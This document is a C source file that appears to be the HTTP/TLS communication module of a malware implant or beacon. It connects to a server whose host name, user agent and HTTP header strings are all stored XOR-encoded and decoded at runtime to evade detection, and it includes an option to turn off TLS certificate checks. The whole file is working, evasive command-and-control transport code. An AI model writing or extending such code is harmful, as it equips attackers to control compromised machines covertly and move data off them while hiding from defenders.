#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <errno.h>
#include "http.h"
#include "beacon.h"
#include "config.h"
#include "util/obf.h"
#include "obf_strings.h"

#if SERVER_USE_TLS
#include <mbedtls/ssl.h>
#include <mbedtls/net_sockets.h>
#include <mbedtls/ctr_drbg.h>
#include <mbedtls/x509_crt.h>

extern mbedtls_ctr_drbg_context g_drbg;

static mbedtls_ssl_config g_ssl_conf;
static mbedtls_x509_crt g_cacert;
static int g_tls_inited = 0;
#endif

int http_init(void) {
#if SERVER_USE_TLS
    mbedtls_ssl_config_init(&g_ssl_conf);
    mbedtls_x509_crt_init(&g_cacert);
    if (mbedtls_ssl_config_defaults(&g_ssl_conf,
            MBEDTLS_SSL_IS_CLIENT,
            MBEDTLS_SSL_TRANSPORT_STREAM,
            MBEDTLS_SSL_PRESET_DEFAULT) != 0)
        return -1;
    mbedtls_ssl_conf_rng(&g_ssl_conf, mbedtls_ctr_drbg_random, &g_drbg);
#if IGNORE_CERT_ERRORS
    mbedtls_ssl_conf_authmode(&g_ssl_conf, MBEDTLS_SSL_VERIFY_NONE);
#else
    mbedtls_ssl_conf_authmode(&g_ssl_conf, MBEDTLS_SSL_VERIFY_OPTIONAL);
#endif
    g_tls_inited = 1;
#endif
    return 0;
}

void http_cleanup(void) {
#if SERVER_USE_TLS
    if (g_tls_inited) {
        mbedtls_ssl_config_free(&g_ssl_conf);
        mbedtls_x509_crt_free(&g_cacert);
        g_tls_inited = 0;
    }
#endif
}

static int tcp_connect(const char *host, const char *port_str) {
    struct addrinfo hints = {0}, *res, *rp;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, port_str, &hints, &res) != 0)
        return -1;

    int fd = -1;
    for (rp = res; rp; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(fd);
        fd = -1;
    }
    freeaddrinfo(res);

    if (fd >= 0) {
        struct timeval tv = { .tv_sec = RECV_TIMEOUT_SEC, .tv_usec = 0 };
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    }
    return fd;
}

static int send_all(int fd, const uint8_t *buf, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        ssize_t n = send(fd, buf + sent, len - sent, 0);
        if (n <= 0) return -1;
        sent += (size_t)n;
    }
    return 0;
}

static int recv_all(int fd, uint8_t *buf, size_t len) {
    size_t got = 0;
    while (got < len) {
        ssize_t n = recv(fd, buf + got, len - got, 0);
        if (n <= 0) return -1;
        got += (size_t)n;
    }
    return 0;
}

#if SERVER_USE_TLS
static int tls_send_all(mbedtls_ssl_context *ssl, const uint8_t *buf, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        int n = mbedtls_ssl_write(ssl, buf + sent, len - sent);
        if (n <= 0) return -1;
        sent += (size_t)n;
    }
    return 0;
}

static int tls_recv_all(mbedtls_ssl_context *ssl, uint8_t *buf, size_t len) {
    size_t got = 0;
    while (got < len) {
        int n = mbedtls_ssl_read(ssl, buf + got, len - got);
        if (n <= 0) return -1;
        got += (size_t)n;
    }
    return 0;
}
#endif

static const char *strcasestr_simple(const char *haystack, const char *needle) {
    size_t nlen = strlen(needle);
    for (; *haystack; haystack++) {
        if (strncasecmp(haystack, needle, nlen) == 0)
            return haystack;
    }
    return NULL;
}

static int parse_content_length(const char *headers) {
    char cl_label[ENC_LX_CONTENT_LENGTH_LEN + 1];
    xor_dec(cl_label, ENC_LX_CONTENT_LENGTH, ENC_LX_CONTENT_LENGTH_LEN);
    const char *cl = strcasestr_simple(headers, cl_label);
    if (!cl) return -1;
    cl += 15;
    while (*cl == ' ') cl++;
    char *end;
    long val = strtol(cl, &end, 10);
    if (end == cl || val <= 0 || val > 16 * 1024 * 1024) return -1;
    return (int)val;
}

static int parse_status_code(const char *headers) {
    const char *sp = strchr(headers, ' ');
    if (!sp) return -1;
    return atoi(sp + 1);
}

int http_request(const char *method, const char *path,
                 const uint8_t *body, size_t body_len,
                 uint8_t *resp_buf, size_t resp_max) {
    char host[256];
    xor_dec(host, ENC_SERVER_HOST, ENC_SERVER_HOST_LEN);

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%d", SERVER_PORT);

    int fd = tcp_connect(host, port_str);
    if (fd < 0) return -1;

    char ua[256];
    xor_dec(ua, ENC_USER_AGENT, ENC_USER_AGENT_LEN);
    char ct[64];
    xor_dec(ct, ENC_CONTENT_TYPE, ENC_CONTENT_TYPE_LEN);

    char fmt_req[ENC_LX_HTTP_REQ_LINE_LEN + 1];
    xor_dec(fmt_req, ENC_LX_HTTP_REQ_LINE, ENC_LX_HTTP_REQ_LINE_LEN);
    char fmt_host[ENC_LX_HOST_HDR_LEN + 1];
    xor_dec(fmt_host, ENC_LX_HOST_HDR, ENC_LX_HOST_HDR_LEN);
    char fmt_ua[ENC_LX_UA_HDR_LEN + 1];
    xor_dec(fmt_ua, ENC_LX_UA_HDR, ENC_LX_UA_HDR_LEN);
    char fmt_ct[ENC_LX_CT_HDR_LEN + 1];
    xor_dec(fmt_ct, ENC_LX_CT_HDR, ENC_LX_CT_HDR_LEN);
    char fmt_cl[ENC_LX_CL_HDR_LEN + 1];
    xor_dec(fmt_cl, ENC_LX_CL_HDR, ENC_LX_CL_HDR_LEN);
    char conn_close[ENC_LX_CONN_CLOSE_LEN + 1];
    xor_dec(conn_close, ENC_LX_CONN_CLOSE, ENC_LX_CONN_CLOSE_LEN);

    char hdr[1024];
    int hdr_len = 0;
    hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, fmt_req, method, path);
    hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, fmt_host, host, port_str);
    hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, fmt_ua, ua);
    if (body && body_len > 0) {
        hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, fmt_ct, ct);
        hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, fmt_cl, body_len);
    }
    hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, "%s\r\n", conn_close);

    int result = -1;

#if SERVER_USE_TLS
    mbedtls_ssl_context ssl;
    mbedtls_net_context net;
    mbedtls_ssl_init(&ssl);
    mbedtls_net_init(&net);
    net.fd = fd;

    if (mbedtls_ssl_setup(&ssl, &g_ssl_conf) != 0) goto cleanup_tls;
    mbedtls_ssl_set_bio(&ssl, &net, mbedtls_net_send, mbedtls_net_recv, NULL);

    int ret;
    while ((ret = mbedtls_ssl_handshake(&ssl)) != 0) {
        if (ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE)
            goto cleanup_tls;
    }

    if (tls_send_all(&ssl, (const uint8_t *)hdr, hdr_len) != 0) goto cleanup_tls;
    if (body && body_len > 0)
        if (tls_send_all(&ssl, body, body_len) != 0) goto cleanup_tls;

    char resp_hdr[4096];
    int rh_pos = 0;
    while (rh_pos < (int)sizeof(resp_hdr) - 1) {
        int n = mbedtls_ssl_read(&ssl, (uint8_t *)resp_hdr + rh_pos, 1);
        if (n <= 0) goto cleanup_tls;
        rh_pos++;
        if (rh_pos >= 4 && memcmp(resp_hdr + rh_pos - 4, "\r\n\r\n", 4) == 0) break;
    }
    resp_hdr[rh_pos] = '\0';

    int status = parse_status_code(resp_hdr);
    int clen = parse_content_length(resp_hdr);
    if (clen < 0) clen = 0;
    if ((size_t)clen > resp_max) clen = (int)resp_max;
    if (clen > 0)
        if (tls_recv_all(&ssl, resp_buf, clen) != 0) goto cleanup_tls;
    result = (status >= 200 && status < 300) ? clen : -1;

cleanup_tls:
    mbedtls_ssl_close_notify(&ssl);
    mbedtls_ssl_free(&ssl);
    mbedtls_net_free(&net);
    return result;

#else
    if (send_all(fd, (const uint8_t *)hdr, hdr_len) != 0) goto cleanup;
    if (body && body_len > 0)
        if (send_all(fd, body, body_len) != 0) goto cleanup;

    char resp_hdr[4096];
    int rh_pos = 0;
    while (rh_pos < (int)sizeof(resp_hdr) - 1) {
        ssize_t n = recv(fd, resp_hdr + rh_pos, 1, 0);
        if (n <= 0) goto cleanup;
        rh_pos++;
        if (rh_pos >= 4 && memcmp(resp_hdr + rh_pos - 4, "\r\n\r\n", 4) == 0) break;
    }
    resp_hdr[rh_pos] = '\0';

    int status = parse_status_code(resp_hdr);
    int clen = parse_content_length(resp_hdr);
    if (clen < 0) clen = 0;
    if ((size_t)clen > resp_max) clen = (int)resp_max;
    if (clen > 0)
        if (recv_all(fd, resp_buf, clen) != 0) goto cleanup;
    result = (status >= 200 && status < 300) ? clen : -1;

cleanup:
    close(fd);
    return result;
#endif
}
